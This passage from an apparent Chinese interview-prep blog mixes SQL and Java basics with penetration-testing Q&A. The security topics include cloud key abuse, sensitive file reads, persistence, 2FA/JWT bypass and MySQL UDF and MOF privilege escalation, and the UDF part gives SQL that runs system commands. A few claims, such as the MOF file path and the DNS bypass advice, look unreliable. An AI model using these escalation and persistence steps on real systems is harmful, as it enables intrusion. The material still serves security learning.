<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> table1 <span class="keyword">WHERE</span> column1 <span class="keyword">IN</span> (<span class="keyword">SELECT</span> column2 <span class="keyword">FROM</span> table2 <span class="keyword">WHERE</span> <span class="keyword">condition</span>);</span><br></pre></td></tr></table></figure>

<h3 id="IP-地址出现次数的统计"><a href="#IP-地址出现次数的统计" class="headerlink" title="IP 地址出现次数的统计"></a>IP 地址出现次数的统计</h3><p>假设有一个表 <code>ip_logs</code>，其中包含 <code>ip_address</code> 字段，要统计每个 IP 地址出现的次数并按降序排列：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ip_address, <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> occurrence</span><br><span class="line"><span class="keyword">FROM</span> ip_logs</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ip_address</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> occurrence <span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><p>工厂模式是一种创建型设计模式，用于创建对象而不暴露创建逻辑。工厂模式的核心是定义一个创建对象的接口，由子类决定实例化哪一个类。例如：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Draw a circle.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Draw a rectangle.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String shapeType)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (shapeType.equalsIgnoreCase(<span class="string">&quot;CIRCLE&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shapeType.equalsIgnoreCase(<span class="string">&quot;RECTANGLE&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Java-如何保证线程安全"><a href="#Java-如何保证线程安全" class="headerlink" title="Java 如何保证线程安全"></a>Java 如何保证线程安全</h3><p>Java 中保证线程安全的方法包括：</p>
<ul>
<li><strong>同步机制</strong>：使用 <code>synchronized</code> 关键字或 <code>ReentrantLock</code> 等显式锁。</li>
<li><strong>不可变对象</strong>：创建不可变对象，确保对象的状态不会被修改。</li>
<li><strong>线程安全的类</strong>：使用线程安全的集合类，如 <code>ConcurrentHashMap</code>。</li>
</ul>
<h3 id="CPU-占用过高但结果返回很慢的原因及解决"><a href="#CPU-占用过高但结果返回很慢的原因及解决" class="headerlink" title="CPU 占用过高但结果返回很慢的原因及解决"></a>CPU 占用过高但结果返回很慢的原因及解决</h3><ul>
<li><strong>原因</strong>：可能是由于算法效率低、死锁、资源竞争等问题导致 CPU 占用高但响应慢。</li>
<li><strong>解决</strong>：优化算法、检查并解决死锁问题、合理管理资源。</li>
</ul>
<h3 id="内存占用过高的原因及解决"><a href="#内存占用过高的原因及解决" class="headerlink" title="内存占用过高的原因及解决"></a>内存占用过高的原因及解决</h3><ul>
<li><strong>原因</strong>：可能是内存泄漏、大对象分配、频繁的垃圾回收等问题。</li>
<li><strong>解决</strong>：使用内存分析工具查找内存泄漏、优化对象的创建和销毁、调整 JVM 参数。</li>
</ul>
<h3 id="线程池线程数量的设置"><a href="#线程池线程数量的设置" class="headerlink" title="线程池线程数量的设置"></a>线程池线程数量的设置</h3><p>线程池的线程数量应根据任务的性质和系统的资源来设置。对于 CPU 密集型任务，线程数量可以设置为 CPU 核心数加一；对于 I&#x2F;O 密集型任务，可以设置更多的线程。线程过多可能导致资源耗尽和上下文切换开销，线程过少可能导致任务排队等待时间过长。</p>
<h3 id="云AK-SK相关的利用和防御"><a href="#云AK-SK相关的利用和防御" class="headerlink" title="云AK&#x2F;SK相关的利用和防御"></a>云AK&#x2F;SK相关的利用和防御</h3><p><strong>利用</strong>：</p>
<ul>
<li><strong>存储桶接管</strong>：使用工具如OSS Browser或行云管家，通过AK&#x2F;SK登录云存储服务，接管存储桶，进行查看、上传、编辑、删除等操作。</li>
<li><strong>命令执行</strong>：利用AK&#x2F;SK通过云管理平台或工具（如CF框架）对云主机进行命令执行。</li>
<li><strong>资源访问</strong>：使用AK&#x2F;SK访问和操作云上的其他资源，如数据库、服务器等。</li>
</ul>
<p><strong>防御</strong>：</p>
<ul>
<li><strong>定期更换AK&#x2F;SK</strong>：降低长期使用同一组AK&#x2F;SK导致泄露的风险。</li>
<li><strong>最小权限原则</strong>：为不同业务分配不同子账户的AK&#x2F;SK，限制权限。</li>
<li><strong>多因素认证</strong>：开启主账号多因素认证，降低因密码泄漏导致的未授权访问。</li>
<li><strong>安全存储</strong>：将AK&#x2F;SK存储在安全的密钥管理系统中，避免嵌入代码或配置文件。</li>
</ul>
<h3 id="在只有任意文件读取的情况下有什么利用方式"><a href="#在只有任意文件读取的情况下有什么利用方式" class="headerlink" title="在只有任意文件读取的情况下有什么利用方式"></a>在只有任意文件读取的情况下有什么利用方式</h3><ul>
<li><strong>读取敏感文件</strong>：读取如<code>/etc/passwd</code>、<code>/etc/shadow</code>等文件获取系统用户信息。</li>
<li><strong>获取配置信息</strong>：读取配置文件获取数据库连接信息、API密钥等敏感数据。</li>
<li><strong>内网信息收集</strong>：读取网络配置文件获取内网结构和IP地址段。</li>
<li><strong>发现其他漏洞</strong>：通过读取日志文件等发现其他潜在的安全漏洞。</li>
</ul>
<h3 id="怎么找开了什么服务（-proc-pid-cmdline）"><a href="#怎么找开了什么服务（-proc-pid-cmdline）" class="headerlink" title="怎么找开了什么服务（/proc/pid/cmdline）"></a>怎么找开了什么服务（<code>/proc/pid/cmdline</code>）</h3><p>通过读取<code>/proc</code>目录下的文件可以获取系统中运行的进程和服务信息。例如，<code>/proc/pid/cmdline</code>文件包含了进程启动时的命令行参数，通过读取该文件可以了解某个进程启动了哪些服务。</p>
<h3 id="怎么找配置文件"><a href="#怎么找配置文件" class="headerlink" title="怎么找配置文件"></a>怎么找配置文件</h3><ul>
<li><strong>常见路径</strong>：检查常见的配置文件路径，如<code>/etc/</code>目录下的文件。</li>
<li><strong>文件搜索命令</strong>：使用<code>find</code>或<code>locate</code>命令搜索包含特定关键词的配置文件。</li>
<li><strong>服务相关路径</strong>：根据运行的服务查找对应的配置文件路径。</li>
</ul>
<h3 id="Linux开机自启动文件-etc-rc-d-rc-local、-etc-init-d"><a href="#Linux开机自启动文件-etc-rc-d-rc-local、-etc-init-d" class="headerlink" title="Linux开机自启动文件/etc/rc.d/rc.local、/etc/init.d"></a>Linux开机自启动文件<code>/etc/rc.d/rc.local</code>、<code>/etc/init.d</code></h3><p>这些文件用于配置系统开机时自动启动的程序和服务。攻击者可以修改这些文件，添加恶意程序或后门，以实现持久化攻击。</p>
<h3 id="SSO相关的攻击方式"><a href="#SSO相关的攻击方式" class="headerlink" title="SSO相关的攻击方式"></a>SSO相关的攻击方式</h3><ul>
<li><strong>令牌窃取</strong>：窃取用户的SSO令牌，冒充用户进行认证。</li>
<li><strong>钓鱼攻击</strong>：通过伪造的SSO登录页面获取用户的凭证。</li>
<li><strong>中间人攻击</strong>：在SSO认证过程中拦截和篡改认证信息。</li>
</ul>
<h3 id="怎么绕过动态token"><a href="#怎么绕过动态token" class="headerlink" title="怎么绕过动态token"></a>怎么绕过动态token</h3><ul>
<li><strong>令牌预测</strong>：如果动态token的生成算法存在漏洞，攻击者可能预测下一个token。</li>
<li><strong>重放攻击</strong>：截获token并在有效期内重复使用。</li>
<li><strong>漏洞利用</strong>：利用系统对token验证的漏洞，如不严格的签名验证。</li>
</ul>
<h3 id="怎么绕过双因子认证"><a href="#怎么绕过双因子认证" class="headerlink" title="怎么绕过双因子认证"></a>怎么绕过双因子认证</h3><ul>
<li><strong>社会工程学</strong>：诱骗用户透露双因子认证信息。</li>
<li><strong>中间人攻击</strong>：拦截双因子认证过程中传输的信息。</li>
<li><strong>设备感染</strong>：在用户的设备上安装恶意软件，截获认证信息。</li>
</ul>
<h3 id="域环境怎么打"><a href="#域环境怎么打" class="headerlink" title="域环境怎么打"></a>域环境怎么打</h3><ul>
<li><strong>权限提升</strong>：利用域环境中的漏洞获取更高权限。</li>
<li><strong>横向移动</strong>：在域内不同系统间移动，扩大攻击范围。</li>
<li><strong>信任关系利用</strong>：利用域间的信任关系进行攻击。</li>
</ul>
<h3 id="IIS文件解析漏洞"><a href="#IIS文件解析漏洞" class="headerlink" title="IIS文件解析漏洞"></a>IIS文件解析漏洞</h3><ul>
<li><strong>路径截断</strong>：通过特定的路径请求，使IIS错误解析文件类型。</li>
<li><strong>扩展名利用</strong>：利用IIS对文件扩展名解析的漏洞，执行恶意脚本。</li>
<li><strong>配置错误</strong>：利用IIS配置错误，访问未授权的资源。</li>
</ul>
<h3 id="Redis攻击方式"><a href="#Redis攻击方式" class="headerlink" title="Redis攻击方式"></a>Redis攻击方式</h3><ul>
<li><strong>未授权访问</strong>：如果Redis实例没有设置密码，攻击者可以直接连接并操作。</li>
<li><strong>弱密码攻击</strong>：通过暴力破解等方式获取Redis的访问密码。</li>
<li><strong>命令注入</strong>：在Redis命令执行过程中注入恶意命令。</li>
</ul>
<h3 id="Redis主从复制条件"><a href="#Redis主从复制条件" class="headerlink" title="Redis主从复制条件"></a>Redis主从复制条件</h3><ul>
<li><strong>网络连通性</strong>：主从Redis实例之间需要能够进行网络通信。</li>
<li><strong>配置正确</strong>：从服务器需要正确配置主服务器的IP地址和端口。</li>
<li><strong>权限设置</strong>：从服务器需要有权限连接到主服务器并进行数据同步。</li>
</ul>
<h3 id="JWT攻击方式"><a href="#JWT攻击方式" class="headerlink" title="JWT攻击方式"></a>JWT攻击方式</h3><ul>
<li><strong>密钥泄露</strong>：如果用于签名JWT的密钥泄露，攻击者可以伪造JWT。</li>
<li><strong>算法混淆</strong>：利用JWT算法的漏洞或不正确配置，如将HS256改为none。</li>
<li><strong>中间人攻击</strong>：在传输过程中截获JWT并篡改。</li>
</ul>
<h3 id="栈溢出原理"><a href="#栈溢出原理" class="headerlink" title="栈溢出原理"></a>栈溢出原理</h3><p>栈溢出是一种缓冲区溢出类型，发生在程序使用栈来存储局部变量时。当输入的数据超过为变量分配的栈空间时，额外的数据会覆盖栈中的其他信息，如返回地址。攻击者可以利用这一点，将返回地址替换为恶意代码的地址，从而控制程序的执行流程。</p>
<h3 id="栈溢出保护机制"><a href="#栈溢出保护机制" class="headerlink" title="栈溢出保护机制"></a>栈溢出保护机制</h3><ul>
<li><strong>栈保护</strong>：编译器可以添加保护字节（如<code>-fstack-protector</code>），在栈中设置一个“金丝雀”值，溢出时会被覆盖，从而检测到溢出。</li>
<li><strong>NX位</strong>：设置内存区域为不可执行，防止在栈中执行恶意代码。</li>
<li><strong>ASLR</strong>：地址空间布局随机化，使得攻击者难以预测返回地址的位置。</li>
</ul>
<h3 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h3><p><strong>实现方法</strong>：<br>UDF（User Defined Function）提权是一种利用MySQL的自定义函数功能来提升权限的技术。攻击者通过编写并加载恶意的UDF文件，可以在MySQL服务器上执行任意系统命令，从而提升权限。</p>
<ol>
<li><strong>编写UDF文件</strong>：编写一个恶意的UDF函数，例如<code>sys_exec</code>，该函数能够执行系统命令。</li>
<li><strong>编译UDF文件</strong>：将编写好的UDF文件编译为共享库文件（如<code>.so</code>或<code>.dll</code>）。</li>
<li><strong>上传UDF文件</strong>：将编译好的共享库文件上传到MySQL服务器的插件目录（如<code>/usr/lib/mysql/plugin</code>或<code>C:\Program Files\MySQL\MySQL Server 8.0\lib\plugin</code>）。</li>
<li><strong>注册UDF</strong>：在MySQL中注册该UDF，通过执行<code>CREATE FUNCTION</code>语句。</li>
<li><strong>执行命令</strong>：通过调用注册的UDF函数执行系统命令。</li>
</ol>
<p><strong>示例</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_exec <span class="keyword">RETURNS</span> <span class="type">INTEGER</span> SONAME <span class="string">&#x27;sys_exec.so&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> sys_exec(<span class="string">&#x27;id &gt; /tmp/mysql_priv_test&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>UDF提权写入时乱码怎么办</strong>：<br>如果在写入UDF文件时出现乱码，可能是由于编码问题。可以尝试以下方法解决：</p>
<ul>
<li>确保文件的编码格式正确，通常使用UTF-8编码。</li>
<li>在上传文件时，确保使用正确的编码方式，例如使用<code>LOAD DATA INFILE</code>或<code>SELECT ... INTO DUMPFILE</code>时，确保文件内容的编码正确。</li>
</ul>
<p><strong>UDF需要什么条件</strong>：</p>
<ul>
<li><strong>MySQL版本</strong>：MySQL版本大于5.1时，UDF文件必须放置在<code>lib/plugin</code>目录下；版本小于5.1时，文件需要放置在系统目录如<code>/usr/lib</code>或<code>C:\Windows\System32</code>。</li>
<li><strong>权限</strong>：需要具有MySQL的<code>INSERT</code>和<code>DELETE</code>权限，以及对插件目录的写入权限。</li>
<li><strong>secure_file_priv</strong>：<code>secure_file_priv</code>的值必须为空，或者允许写入到指定目录。</li>
</ul>
<h3 id="服务器启动项提权怎么做，有什么方法"><a href="#服务器启动项提权怎么做，有什么方法" class="headerlink" title="服务器启动项提权怎么做，有什么方法"></a>服务器启动项提权怎么做，有什么方法</h3><p><strong>方法</strong>：</p>
<ol>
<li><strong>利用计划任务</strong>：通过添加计划任务（如<code>cron</code>或<code>at</code>）来执行恶意脚本或命令。</li>
<li><strong>修改启动脚本</strong>：修改系统的启动脚本（如<code>/etc/rc.local</code>或<code>/etc/init.d</code>）来执行恶意代码。</li>
<li><strong>利用服务</strong>：创建或修改系统服务（如<code>systemd</code>服务）来执行恶意代码。</li>
</ol>
<h3 id="MOF-提权是怎么实现的"><a href="#MOF-提权是怎么实现的" class="headerlink" title="MOF 提权是怎么实现的"></a>MOF 提权是怎么实现的</h3><p><strong>实现方法</strong>：<br>MOF（Managed Object Format）提权是通过修改WMI（Windows Management Instrumentation）的MOF文件来实现的。攻击者可以通过修改MOF文件来注入恶意代码，从而在系统启动时执行。</p>
<ol>
<li><strong>编写恶意MOF文件</strong>：编写一个恶意的MOF文件，其中包含执行恶意代码的指令。</li>
<li><strong>上传MOF文件</strong>：将恶意MOF文件上传到系统的WMI存储目录（如<code>C:\Windows\System32\wbem\Repository</code>）。</li>
<li><strong>触发执行</strong>：通过重启系统或重新启动WMI服务来触发恶意代码的执行。</li>
</ol>
<h3 id="Linux-怎么看日志，用哪些命令？"><a href="#Linux-怎么看日志，用哪些命令？" class="headerlink" title="Linux 怎么看日志，用哪些命令？"></a>Linux 怎么看日志，用哪些命令？</h3><p><strong>命令</strong>：</p>
<ul>
<li><code>dmesg</code>：查看内核日志。</li>
<li><code>journalctl</code>：查看系统日志（适用于使用<code>systemd</code>的系统）。</li>
<li><code>tail -f /var/log/syslog</code>：实时查看系统日志。</li>
<li><code>tail -f /var/log/auth.log</code>：查看认证日志。</li>
<li><code>tail -f /var/log/apache2/access.log</code>：查看Apache访问日志。</li>
</ul>
<h3 id="Crontab-定时任务知道吗"><a href="#Crontab-定时任务知道吗" class="headerlink" title="Crontab 定时任务知道吗"></a>Crontab 定时任务知道吗</h3><p><strong>Crontab</strong> 是一个用于管理定时任务的工具，可以在指定的时间间隔自动执行任务。可以使用<code>crontab -e</code>命令编辑定时任务，<code>crontab -l</code>命令查看当前用户的定时任务。</p>
<h3 id="58一个服务器遭受ARP欺骗，怎么排查？"><a href="#58一个服务器遭受ARP欺骗，怎么排查？" class="headerlink" title="58一个服务器遭受ARP欺骗，怎么排查？"></a>58一个服务器遭受ARP欺骗，怎么排查？</h3><p><strong>排查步骤</strong>：</p>
<ol>
<li><strong>检查网络流量</strong>：使用工具如<code>tcpdump</code>或<code>Wireshark</code>捕获和分析网络流量，查找异常的ARP数据包。</li>
<li><strong>查看ARP缓存</strong>：使用<code>arp -a</code>命令查看系统的ARP缓存，检查是否存在异常的MAC地址绑定。</li>
<li><strong>检查系统日志</strong>：查看系统日志（如<code>/var/log/syslog</code>）中是否有与ARP欺骗相关的记录。</li>
<li><strong>使用安全工具</strong>：使用如<code>arpwatch</code>等工具监控ARP活动，检测异常行为。</li>
</ol>
<h3 id="怎么查看端口占用"><a href="#怎么查看端口占用" class="headerlink" title="怎么查看端口占用"></a>怎么查看端口占用</h3><p>在Linux系统中，可以使用<code>lsof</code>和<code>netstat</code>命令来查看端口占用情况。</p>
<ul>
<li><p><strong>lsof命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :端口号</span><br></pre></td></tr></table></figure>
<p>例如，查看8000端口的占用情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i :8000</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>netstat命令</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp | grep 端口号</span><br></pre></td></tr></table></figure>
<p>例如，查看8000端口的占用情况：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp | grep 8000</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在Windows系统中，可以使用<code>netstat</code>和<code>tasklist</code>命令来查看端口占用情况。</p>
<ul>
<li><p><strong>netstat命令</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">findstr</span> 端口号</span><br></pre></td></tr></table></figure>
<p>例如，查看1024端口的占用情况：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | <span class="built_in">findstr</span> <span class="number">1024</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>tasklist命令</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | <span class="built_in">findstr</span> PID</span><br></pre></td></tr></table></figure>
<p>例如，查看PID为808的进程：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | <span class="built_in">findstr</span> <span class="number">808</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="一张数据库表最多存多少条记录"><a href="#一张数据库表最多存多少条记录" class="headerlink" title="一张数据库表最多存多少条记录"></a>一张数据库表最多存多少条记录</h3><p>对于Access数据库，单个表的记录数限制为2^32-1，即4294967295条记录。然而，由于Access数据库的大小限制为2GB，实际可存储的记录数通常在2000万条左右。<br>对于SQL Server，数据表的最大记录数取决于数据库的容量，理论上可以存储非常大的记录数，最大可达5,242,720,000,000,000条记录。</p>
<h3 id="遇到子域名泛解析怎么办"><a href="#遇到子域名泛解析怎么办" class="headerlink" title="遇到子域名泛解析怎么办"></a>遇到子域名泛解析怎么办</h3><p>子域名泛解析是一种DNS配置，允许将所有未明确解析的子域名解析到一个特定的IP地址。如果遇到子域名泛解析，可以采取以下措施：</p>
<ul>
<li><strong>利用泛解析进行信息收集</strong>：通过构造不同的子域名，尝试访问可能存在的服务或应用。</li>
<li><strong>绕过泛解析限制</strong>：通过特定的DNS查询技术，如DNSSEC或DNS over HTTPS，绕过泛解析的限制。</li>
<li><strong>结合其他漏洞利用</strong>：利用泛解析结合其他漏洞，如SQL注入、文件包含等，进行更深入的渗透。</li>
</ul>
<h3 id="内网渗透横向手段，135、445端口"><a href="#内网渗透横向手段，135、445端口" class="headerlink" title="内网渗透横向手段，135、445端口"></a>内网渗透横向手段，135、445端口</h3><p>在内网渗透中，135和445端口常用于横向移动：</p>
<ul>
<li><strong>135端口（RPC）</strong>：用于远程过程调用，可以利用RPC漏洞进行权限提升和横向移动。</li>
<li><strong>445端口（SMB）</strong>：用于文件共享和打印服务，可以利用SMB漏洞进行文件读取、写入和命令执行。</li>
</ul>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%EF%BC%88%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">XSS（跨站脚本攻击）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS%E5%AF%B9%E5%BC%95%E5%8F%B7%E5%AE%9E%E4%BD%93%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%88a%E6%A0%87%E7%AD%BE%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">XSS对引号实体的绕过（a标签）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E8%A7%A3%E5%86%B3XSS%E6%BC%8F%E6%B4%9E%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">富文本编辑器解决XSS漏洞问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%8C%E6%96%87%E6%9C%AC%E6%B8%B2%E6%9F%93%E7%9A%84%E9%A2%84%E9%98%B2"><span class="toc-number">1.3.</span> <span class="toc-text">富文本渲染的预防</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2. SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%BFWebShell%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">拿WebShell的方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E5%86%99%E5%85%A5%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">能写入的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UDF%E6%8F%90%E6%9D%83%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">UDF提权的底层原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">2.4.</span> <span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">2.5.</span> <span class="toc-text">不能预编译的情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORDER-BY%E4%B8%8D%E8%83%BD%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.6.</span> <span class="toc-text">ORDER BY不能预编译的原因</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ORDER-BY%E8%AF%AD%E6%B3%95%E6%A0%91%E6%8A%A5%E9%94%99%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.7.</span> <span class="toc-text">ORDER BY语法树报错的原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.</span> <span class="toc-text">3. 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%99%A4%E4%BA%86%E6%8B%BFWebShell%E8%BF%98%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">3.1.</span> <span class="toc-text">除了拿WebShell还能做什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%A0HTML%E5%90%8E%E8%BF%98%E8%83%BD%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">3.2.</span> <span class="toc-text">传HTML后还能做什么</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache-PHP-JPG%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">Apache PHP JPG白名单绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.</span> <span class="toc-text">IIS白名单绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-CSRF%EF%BC%88%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">4. CSRF（跨站请求伪造）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Token%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.1.</span> <span class="toc-text">Token的实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EJWT"><span class="toc-number">4.2.</span> <span class="toc-text">关于JWT</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">5. 命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">5.1.</span> <span class="toc-text">命令执行的原因</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB"><span class="toc-number">6.</span> <span class="toc-text">8. 内网攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%9F%9F%E6%8E%A7%E6%94%BB%E5%87%BB"><span class="toc-number">6.1.</span> <span class="toc-text">内网域控攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">9. 业务漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 